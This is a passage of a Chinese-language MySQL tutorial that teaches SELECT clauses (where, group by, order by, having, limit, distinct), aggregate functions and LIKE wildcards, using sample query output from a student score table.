<p>答：高考分数峰值访问量非常大，这时候就是性能更重要。当性能和规范化冲突的时候，我们首选性能。这就是“反三范式”。</p>
<p>小结</p>
<p>1、第一范式约束的所有字段</p>
<p>2、第二范式约束的主键和非主键的关系</p>
<p>3、第三范式约束的非主键之间的关系</p>
<p>4、范式越高，冗余越少，但表业越多。</p>
<p>5、规范化和性能的关系 ：性能比规范化更重要</p>
<h4 id="1-4-5-例题"><a href="#1-4-5-例题" class="headerlink" title="1.4.5  例题"></a>1.4.5  例题</h4><p>需求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">假设某建筑公司要设计一个数据库。公司的业务规</span><br><span class="line">则概括说明如下：</span><br><span class="line">公司承担多个工程项目，每一项工程有：工程号、工程名称、施工人员等</span><br><span class="line">公司有多名职工，每一名职工有：职工号、姓名、性别、职务（工程师、技术员）等</span><br><span class="line">公司按照工时和小时工资率支付工资，小时工资率由职工的职务决定（例如，技术员的小时工资率与工程师不同）</span><br></pre></td></tr></table></figure>

<p>标识实体</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、工程</span><br><span class="line">2、职工</span><br><span class="line">3、工时</span><br><span class="line">4、小时工资率</span><br></pre></td></tr></table></figure>

<p> <img src="/images/1560235875441.png" alt="1560235875441"></p>
<h2 id="1-5-查询语句"><a href="#1-5-查询语句" class="headerlink" title="1.5  查询语句"></a>1.5  查询语句</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">语法：select [选项] 列名 [from 表名] [where 条件]  [group by 分组] [order by 排序][having 条件] [limit 限制]</span><br></pre></td></tr></table></figure>

<h4 id="1-5-1-字段表达式"><a href="#1-5-1-字段表达式" class="headerlink" title="1.5.1   字段表达式"></a>1.5.1   字段表达式</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 可以直接输出内容</span><br><span class="line">mysql&gt; select &#x27;锄禾日当午&#x27;;</span><br><span class="line">+------------+</span><br><span class="line">| 锄禾日当午          |</span><br><span class="line">+------------+</span><br><span class="line">| 锄禾日当午          |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 输出表达式</span><br><span class="line">mysql&gt; select 10*10;</span><br><span class="line">+-------+</span><br><span class="line">| 10*10 |</span><br><span class="line">+-------+</span><br><span class="line">|   100 |</span><br><span class="line">+-------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ch,math,ch+math from stu;</span><br><span class="line">+------+------+---------+</span><br><span class="line">| ch   | math | ch+math |</span><br><span class="line">+------+------+---------+</span><br><span class="line">|   80 | NULL |    NULL |</span><br><span class="line">|   77 |   76 |     153 |</span><br><span class="line">|   55 |   82 |     137 |</span><br><span class="line">| NULL |   74 |    NULL |</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-- 表达式部分可以用函数</span><br><span class="line">mysql&gt; select rand();</span><br><span class="line">+--------------------+</span><br><span class="line">| rand()             |</span><br><span class="line">+--------------------+</span><br><span class="line">| 0.6669325378415478 |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>通过as给字段取别名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select &#x27;锄禾日当午&#x27; as &#x27;标题&#x27;;   -- 取别名</span><br><span class="line">+------------+</span><br><span class="line">| 标题           |</span><br><span class="line">+------------+</span><br><span class="line">| 锄禾日当午          |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select ch,math,ch+math as &#x27;总分&#x27; from stu;</span><br><span class="line">+------+------+------+</span><br><span class="line">| ch   | math | 总分    |</span><br><span class="line">+------+------+------+</span><br><span class="line">|   80 | NULL | NULL |</span><br><span class="line">|   77 |   76 |  153 |</span><br><span class="line">|   55 |   82 |  137 |</span><br><span class="line">| NULL |   74 | NULL |</span><br><span class="line"></span><br><span class="line">-- 多学一招：as可以省略</span><br><span class="line">mysql&gt; select ch,math,ch+math &#x27;总分&#x27; from stu;</span><br><span class="line">+------+------+------+</span><br><span class="line">| ch   | math | 总分    |</span><br><span class="line">+------+------+------+</span><br><span class="line">|   80 | NULL | NULL |</span><br><span class="line">|   77 |   76 |  153 |</span><br><span class="line">|   55 |   82 |  137 |</span><br><span class="line">| NULL |   74 | NULL |</span><br></pre></td></tr></table></figure>



<h4 id="1-5-2-from子句"><a href="#1-5-2-from子句" class="headerlink" title="1.5.2   from子句"></a>1.5.2   from子句</h4><p>from：来自，from后面跟的是数据源。数据源可以有多个。返回笛卡尔积。</p>
<p>插入测试表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">create table t1(</span><br><span class="line">       str char(2)</span><br><span class="line">);</span><br><span class="line">insert into t1 values (&#x27;aa&#x27;),(&#x27;bb&#x27;);</span><br><span class="line">create table t2(</span><br><span class="line">       num int</span><br><span class="line">);</span><br><span class="line">insert into t2 values (10),(20);</span><br></pre></td></tr></table></figure>

<p>测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- from子句</span><br><span class="line">mysql&gt; select * from t1;</span><br><span class="line">+------+</span><br><span class="line">| str  |</span><br><span class="line">+------+</span><br><span class="line">| aa   |</span><br><span class="line">| bb   |</span><br><span class="line">+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 多个数据源,返回笛卡尔积</span><br><span class="line">mysql&gt; select * from t1,t2;</span><br><span class="line">+------+------+</span><br><span class="line">| str  | num  |</span><br><span class="line">+------+------+</span><br><span class="line">| aa   |   10 |</span><br><span class="line">| bb   |   10 |</span><br><span class="line">| aa   |   20 |</span><br><span class="line">| bb   |   20 |</span><br><span class="line">+------+------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h4 id="1-5-3-dual表"><a href="#1-5-3-dual表" class="headerlink" title="1.5.3   dual表"></a>1.5.3   dual表</h4><p>dual表是一个伪表。在有些特定情况下，没有具体的表的参与，但是为了保证select语句的完整又必须要一个表名，这时候就使用伪表。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select 10*10 as 结果 from dual;</span><br><span class="line">+------+</span><br><span class="line">| 结果     |</span><br><span class="line">+------+</span><br><span class="line">|  100 |</span><br><span class="line">+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h4 id="1-5-4-where子句"><a href="#1-5-4-where子句" class="headerlink" title="1.5.4   where子句"></a>1.5.4   where子句</h4><p>where后面跟的是条件，在数据源中进行筛选。返回条件为真记录</p>
<p>MySQL支持的运算符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 比较运算符</span><br><span class="line">&gt;	大于</span><br><span class="line">&lt;	小于</span><br><span class="line">&gt;=	大于等于</span><br><span class="line">&lt;=	小于等于</span><br><span class="line">=	等于</span><br><span class="line">!=	不等于</span><br><span class="line">-- 逻辑运算符</span><br><span class="line">and  与</span><br><span class="line">or   或</span><br><span class="line">not  非</span><br><span class="line">-- 其他</span><br><span class="line">in | not in	 					 字段的值在枚举范围内</span><br><span class="line">between…and|not between…and      字段的值在数字范围内</span><br><span class="line">is null | is not null			 字段的值不为空</span><br></pre></td></tr></table></figure>

<p>例题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 查找语文成绩及格的学生</span><br><span class="line">mysql&gt; select * from stu where ch&gt;=60;</span><br><span class="line">-- 查询语文和数学都及格的学生</span><br><span class="line">mysql&gt; select * from stu where ch&gt;=60 and math&gt;=60;</span><br><span class="line">-- 查询语文或数学不及格的学生</span><br><span class="line">mysql&gt; select * from stu where ch&lt;60 or math&lt;60;</span><br></pre></td></tr></table></figure>

<p>思考：如下语句输出什么？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from stu where 1;		-- 输出所有数据</span><br><span class="line">mysql&gt; select * from stu where 0;		-- 不输出数据</span><br></pre></td></tr></table></figure>

<p>思考：如何查找北京和上海的学生</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 通过or实现</span><br><span class="line">mysql&gt; select * from stu where stuaddress=&#x27;北京&#x27; or stuaddress=&#x27;上海&#x27;;</span><br><span class="line"></span><br><span class="line">-- 通过in语句实现</span><br><span class="line">mysql&gt; select * from stu where stuaddress in (&#x27;北京&#x27;,&#x27;上海&#x27;);</span><br><span class="line"></span><br><span class="line">-- 查询不是北京和上海的学生</span><br><span class="line">mysql&gt; select * from stu where stuaddress not in (&#x27;北京&#x27;,&#x27;上海&#x27;);</span><br></pre></td></tr></table></figure>



<p>思考：查找年龄在20~25之间</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 方法一：</span><br><span class="line">mysql&gt; select * from stu where stuage&gt;=20 and stuage&lt;=25;</span><br><span class="line"></span><br><span class="line">-- 方法二：</span><br><span class="line">mysql&gt; select * from stu where not(stuage&lt;20 or stuage&gt;25);</span><br><span class="line"></span><br><span class="line">-- 方法三：between...and...</span><br><span class="line">mysql&gt; select * from stu where stuage between 20 and 25;</span><br><span class="line"></span><br><span class="line">-- 年龄不在20~25之间</span><br><span class="line">mysql&gt; select * from stu where stuage not between 20 and 25;</span><br></pre></td></tr></table></figure>



<p>思考：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 查找缺考的学生</span><br><span class="line">mysql&gt; select * from stu where ch is null or math is null;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25301 | 张秋丽         | 男       |     18 |       1 | 北京           |   80 | NULL |</span><br><span class="line">| s25304 | 欧阳俊雄        | 男       |     28 |       4 | 天津           | NULL |   74 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line"></span><br><span class="line">-- 查找没有缺考的学生</span><br><span class="line">mysql&gt; select * from stu where ch is not null and math is not null;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25302 | 李文才        | 男       |     31 |       3 | 上海          |   77 |   76 |</span><br><span class="line">| s25303 | 李斯文        | 女      |     22 |       2 | 北京           |   55 |   82 |</span><br><span class="line">| s25305 | 诸葛丽丽         | 女      |     23 |       7 | 河南           |   72 |   56 |</span><br><span class="line">| s25318 | 争青小子        | 男       |     26 |       6 | 天津           |   86 |   92 |</span><br><span class="line">| s25319 | 梅超风        | 女      |     23 |       5 | 河北          |   74 |   67 |</span><br><span class="line">| s25320 | Tom      | 男       |     24 |       8 | 北京           |   65 |   67 |</span><br><span class="line">| s25321 | Tabm     | 女      |     23 |       9 | 河北          |   88 |   77 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 查找需要补考的学生</span><br><span class="line">mysql&gt; select * from stu where ch&lt;60 or math&lt;60 or ch is null or math is null;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25301 | 张秋丽         | 男       |     18 |       1 | 北京           |   80 | NULL |</span><br><span class="line">| s25303 | 李斯文        | 女      |     22 |       2 | 北京           |   55 |   82 |</span><br><span class="line">| s25304 | 欧阳俊雄        | 男       |     28 |       4 | 天津           | NULL |   74 |</span><br><span class="line">| s25305 | 诸葛丽丽         | 女      |     23 |       7 | 河南           |   72 |   56 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>练习：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 1、查找学号是s25301,s25302,s25303的学生</span><br><span class="line">mysql&gt; select * from stu where stuno in (&#x27;s25301&#x27;,&#x27;s25302&#x27;,&#x27;s25303&#x27;);</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25301 | 张秋丽        | 男       |     18 |       1 | 北京           |   80 | NULL |</span><br><span class="line">| s25302 | 李文才       | 男       |     31 |       3 | 上海          |   77 |   76 |</span><br><span class="line">| s25303 | 李斯文       | 女      |     22 |       2 | 北京           |   55 |   82 |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 2、查找年龄是18~20的学生</span><br><span class="line">mysql&gt; select * from stu where stuage between 18 and 20;</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25301 | 张秋丽        | 男       |     18 |       1 | 北京           |   80 | NULL |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h4 id="1-5-5-group-by-【分组查询】"><a href="#1-5-5-group-by-【分组查询】" class="headerlink" title="1.5.5  group by 【分组查询】"></a>1.5.5  group by 【分组查询】</h4><p>将查询的结果分组，分组查询目的在于统计数据。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 查询男生和女生的各自语文平均分</span><br><span class="line">mysql&gt; select stusex,avg(ch) &#x27;平均分&#x27; from stu group by stusex;</span><br><span class="line">+--------+---------+</span><br><span class="line">| stusex | 平均分       |</span><br><span class="line">+--------+---------+</span><br><span class="line">| 女      | 72.2500 |</span><br><span class="line">| 男       | 77.0000 |</span><br><span class="line">+--------+---------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 查询男生和女生各自多少人</span><br><span class="line">mysql&gt; select stusex,count(*) 人数 from stu group by stusex;</span><br><span class="line">+--------+------+</span><br><span class="line">| stusex | 人数     |</span><br><span class="line">+--------+------+</span><br><span class="line">| 女      |    4 |</span><br><span class="line">| 男       |    5 |</span><br><span class="line">+--------+------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 查询每个地区多少人</span><br><span class="line">mysql&gt; select stuaddress,count(*) from stu group by stuaddress;</span><br><span class="line">+------------+----------+</span><br><span class="line">| stuaddress | count(*) |</span><br><span class="line">+------------+----------+</span><br><span class="line">| 上海          |        1 |</span><br><span class="line">| 北京           |        3 |</span><br><span class="line">| 天津           |        2 |</span><br><span class="line">| 河北          |        2 |</span><br><span class="line">| 河南           |        1 |</span><br><span class="line">+------------+----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 每个地区的数学平均分</span><br><span class="line">mysql&gt; select stuaddress,avg(math) from stu group by stuaddress;</span><br><span class="line">+------------+-----------+</span><br><span class="line">| stuaddress | avg(math) |</span><br><span class="line">+------------+-----------+</span><br><span class="line">| 上海          |   76.0000 |</span><br><span class="line">| 北京           |   74.5000 |</span><br><span class="line">| 天津           |   83.0000 |</span><br><span class="line">| 河北          |   72.0000 |</span><br><span class="line">| 河南           |   56.0000 |</span><br><span class="line">+------------+-----------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>查询字段是普通字段，只取第一个值</p>
<p>通过group_concat()函数将同一组的值连接起来显示</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select group_concat(stuname),stusex,avg(math) from stu group by stusex;</span><br><span class="line">+-------------------------------------+--------+-----------+</span><br><span class="line">| group_concat(stuname)               | stusex | avg(math) |</span><br><span class="line">+-------------------------------------+--------+-----------+</span><br><span class="line">| 李斯文,诸葛丽丽,梅超风,Tabm             | 女      |   70.5000 |</span><br><span class="line">| 张秋丽,李文才,欧阳俊雄,争青小子,Tom      | 男       |   77.2500 |</span><br><span class="line">+-------------------------------------+--------+-----------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>多列分组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select stuaddress,stusex,avg(math) from stu group by stuaddress,stusex;</span><br><span class="line">+------------+--------+-----------+</span><br><span class="line">| stuaddress | stusex | avg(math) |</span><br><span class="line">+------------+--------+-----------+</span><br><span class="line">| 上海          | 男       |   76.0000 |</span><br><span class="line">| 北京           | 女      |   82.0000 |</span><br><span class="line">| 北京           | 男       |   67.0000 |</span><br><span class="line">| 天津           | 男       |   83.0000 |</span><br><span class="line">| 河北          | 女      |   72.0000 |</span><br><span class="line">| 河南           | 女      |   56.0000 |</span><br><span class="line">+------------+--------+-----------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>小结：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、如果是分组查询，查询字段是分组字段和聚合函数。</span><br><span class="line">2、查询字段是普通字段，只取第一个值</span><br><span class="line">3、group_concat()将同一组的数据连接起来</span><br></pre></td></tr></table></figure>



<h4 id="1-5-6-order-by排序"><a href="#1-5-6-order-by排序" class="headerlink" title="1.5.6 order by排序"></a>1.5.6 order by排序</h4><p>asc：升序【默认】</p>
<p>desc：降序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 按年龄的升序排列</span><br><span class="line">mysql&gt; select * from stu order by stuage asc;</span><br><span class="line">mysql&gt;  select * from stu order by stuage;       -- 默认是升序</span><br><span class="line"></span><br><span class="line">-- 按总分降序</span><br><span class="line">mysql&gt; select *,ch+math &#x27;总分&#x27; from stu order by ch+math desc;</span><br></pre></td></tr></table></figure>

<p>多列排序</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 年龄升序，如果年龄一样，按ch降序排列</span><br><span class="line">mysql&gt; select * from stu order by stuage asc,ch desc;</span><br></pre></td></tr></table></figure>

<p>思考如下代码表示什么含义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from stu order by stuage desc,ch desc;     #年龄降序，语文降序</span><br><span class="line">select * from stu order by stuage desc,ch asc;		#年龄降序，语文升序</span><br><span class="line">select * from stu order by stuage,ch desc;          #年龄升序、语文降序</span><br><span class="line">select * from stu order by stuage,ch; 				#年龄升序、语文升序</span><br></pre></td></tr></table></figure>



<h4 id="1-5-7-having条件"><a href="#1-5-7-having条件" class="headerlink" title="1.5.7  having条件"></a>1.5.7  having条件</h4><p>having：是在结果集上进行条件筛选</p>
<p>例题</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 查询女生</span><br><span class="line">mysql&gt; select * from stu where stusex=&#x27;女&#x27;;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25303 | 李斯文        | 女      |     22 |       2 | 北京           |   55 |   82 |</span><br><span class="line">| s25305 | 诸葛丽丽         | 女      |     23 |       7 | 河南           |   72 |   56 |</span><br><span class="line">| s25319 | 梅超风        | 女      |     23 |       5 | 河北          |   74 |   67 |</span><br><span class="line">| s25321 | Tabm     | 女      |     23 |       9 | 河北          |   88 |   77 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 查询女生</span><br><span class="line">mysql&gt; select * from stu having stusex=&#x27;女&#x27;;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25303 | 李斯文        | 女      |     22 |       2 | 北京           |   55 |   82 |</span><br><span class="line">| s25305 | 诸葛丽丽         | 女      |     23 |       7 | 河南           |   72 |   56 |</span><br><span class="line">| s25319 | 梅超风        | 女      |     23 |       5 | 河北          |   74 |   67 |</span><br><span class="line">| s25321 | Tabm     | 女      |     23 |       9 | 河北          |   88 |   77 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 查询女生姓名</span><br><span class="line">mysql&gt; select stuname from stu where stusex=&#x27;女&#x27;;</span><br><span class="line">+----------+</span><br><span class="line">| stuname  |</span><br><span class="line">+----------+</span><br><span class="line">| 李斯文        |</span><br><span class="line">| 诸葛丽丽         |</span><br><span class="line">| 梅超风        |</span><br><span class="line">| Tabm     |</span><br><span class="line">+----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 使用having报错，因为结果集中没有stusex字段</span><br><span class="line">mysql&gt; select stuname from stu having stusex=&#x27;女&#x27;;</span><br><span class="line">ERROR 1054 (42S22): Unknown column &#x27;stusex&#x27; in &#x27;having clause&#x27;</span><br></pre></td></tr></table></figure>

<p>小结：having和where的区别：</p>
<p>where是对原始数据进行筛选，having是对记录集进行筛选。 </p>
<h4 id="1-5-8-limit"><a href="#1-5-8-limit" class="headerlink" title="1.5.8 limit"></a>1.5.8 limit</h4><p>语法：limit [起始位置]，显示长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 从第0个位置开始取，取3条记录</span><br><span class="line">mysql&gt; select * from stu limit 0,3;</span><br><span class="line"></span><br><span class="line">-- 从第2个位置开始取，取3条记录</span><br><span class="line">mysql&gt; select * from stu limit 2,3;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25303 | 李斯文        | 女      |     22 |       2 | 北京           |   55 |   82 |</span><br><span class="line">| s25304 | 欧阳俊雄        | 男       |     28 |       4 | 天津           | NULL |   74 |</span><br><span class="line">| s25305 | 诸葛丽丽         | 女      |     23 |       7 | 河南           |   72 |   56 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>起始位置可以省略，默认是从0开始</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select * from stu limit 3;</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">| stuNo  | stuName | stuSex | stuAge | stuSeat | stuAddress | ch   | math |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">| s25301 | 张秋丽        | 男       |     18 |       1 | 北京           |   80 | NULL |</span><br><span class="line">| s25302 | 李文才       | 男       |     31 |       3 | 上海          |   77 |   76 |</span><br><span class="line">| s25303 | 李斯文       | 女      |     22 |       2 | 北京           |   55 |   82 |</span><br><span class="line">+--------+---------+--------+--------+---------+------------+------+------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<p>例题：找出班级总分前三名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select *,ch+math total from stu order by (ch+math) desc limit 0,3;</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+-------+</span><br><span class="line">| stuNo  | stuName  | stuSex | stuAge | stuSeat | stuAddress | ch   | math | total |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+-------+</span><br><span class="line">| s25318 | 争青小子   | 男       |     26 |       6 | 天津           |   86 |   92 |   178 |</span><br><span class="line">| s25321 | Tabm     | 女      |     23 |       9 | 河北          |   88 |   77 |   165 |</span><br><span class="line">| s25302 | 李文才    | 男       |     31 |       3 | 上海          |   77 |   76 |   153 |</span><br><span class="line">+--------+----------+--------+--------+---------+------------+------+------+-------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<p>多学一招：limit在update和delete语句中也是可以使用的。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 	前3名语文成绩加1分</span><br><span class="line">mysql&gt; update stu set ch=ch+1 order by ch+math desc limit 3;</span><br><span class="line">Query OK, 3 rows affected (0.00 sec)</span><br><span class="line">Rows matched: 3  Changed: 3  Warnings: 0</span><br><span class="line"></span><br><span class="line">-- 前3名删除</span><br><span class="line">mysql&gt; delete from stu order by ch+math desc limit 3;</span><br><span class="line">Query OK, 3 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure>



<h4 id="1-5-9-查询语句中的选项"><a href="#1-5-9-查询语句中的选项" class="headerlink" title="1.5.9 查询语句中的选项"></a>1.5.9 查询语句中的选项</h4><p>查询语句中的选项有两个：</p>
<p>1、     all：显示所有数据 【默认】</p>
<p>2、     distinct：去除结果集中重复的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select all stuaddress from stu;</span><br><span class="line">+------------+</span><br><span class="line">| stuaddress |</span><br><span class="line">+------------+</span><br><span class="line">| 北京           |</span><br><span class="line">| 北京           |</span><br><span class="line">| 天津           |</span><br><span class="line">| 河南           |</span><br><span class="line">| 河北          |</span><br><span class="line">| 北京           |</span><br><span class="line">+------------+</span><br><span class="line">6 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">-- 去除重复的项</span><br><span class="line">mysql&gt; select distinct stuaddress from stu;</span><br><span class="line">+------------+</span><br><span class="line">| stuaddress |</span><br><span class="line">+------------+</span><br><span class="line">| 北京           |</span><br><span class="line">| 天津           |</span><br><span class="line">| 河南           |</span><br><span class="line">| 河北          |</span><br><span class="line">+------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h2 id="1-6-聚合函数"><a href="#1-6-聚合函数" class="headerlink" title="1.6   聚合函数"></a>1.6   聚合函数</h2><ol>
<li>sum()  	   求和</li>
<li>avg()          求平均值</li>
<li>max()        求最大值</li>
<li>min()          求最小值</li>
<li>count()      求记录数</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 语文最高分</span><br><span class="line">mysql&gt; select max(ch) &#x27;语文最大值&#x27; from stu;</span><br><span class="line">+------------+</span><br><span class="line">| 语文最大值          |</span><br><span class="line">+------------+</span><br><span class="line">|         88 |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">#求语文总分、语文平均分、语文最低分、总人数</span><br><span class="line"></span><br><span class="line">mysql&gt; select max(ch) 语文最高分,min(ch) 语文最低分,sum(ch) 语文总分,avg(ch) 语文平均分,count(*) 总人数 from stu;</span><br><span class="line">+------------+------------+----------+------------+--------+</span><br><span class="line">| 语文最高分  | 语文最低分   | 语文总分   | 语文平均分  | 总人数  |</span><br><span class="line">+------------+------------+----------+------------+--------+</span><br><span class="line">|         88 |         55 |      597 |    74.6250 |      9 |</span><br><span class="line">+------------+------------+----------+------------+--------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>



<h2 id="1-7-模糊查询"><a href="#1-7-模糊查询" class="headerlink" title="1.7   模糊查询"></a>1.7   模糊查询</h2><h4 id="1-7-1-通配符"><a href="#1-7-1-通配符" class="headerlink" title="1.7.1   通配符"></a>1.7.1   通配符</h4><ol>
<li>_  [下划线]   表示任意一个字符</li>
<li>%  表示任意字符</li>
</ol>
<p>练习</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、满足“T_m”的有（A、C）</span><br><span class="line">A：Tom         B：Toom       C：Tam         D：Tm     E：Tmo</span><br><span class="line"></span><br><span class="line">2、满足“T_m_”的有（ B C）</span><br><span class="line">A:Tmom   B:Tmmm  C:T1m2    D:Tmm     E:Tm</span><br><span class="line"></span><br><span class="line">3、满足“张%”的是（ABCD）</span><br><span class="line">A:张三     B：张三丰     C：张牙舞爪      D：张      E：小张</span><br><span class="line"></span><br><span class="line">4、满足“%诺基亚%”的是（ABCD）</span><br><span class="line">A：诺基亚2100   B：2100诺基亚   C：把我的诺基亚拿过来   D：诺基亚</span><br></pre></td></tr></table></figure>



<h4 id="1-7-2-模糊查询（like）"><a href="#1-7-2-模糊查询（like）" class="headerlink" title="1.7.2   模糊查询（like）"></a>1.7.2   模糊查询（like）</h4><p>模糊查询的条件不能用’&#x3D;’，要使用like。</p>
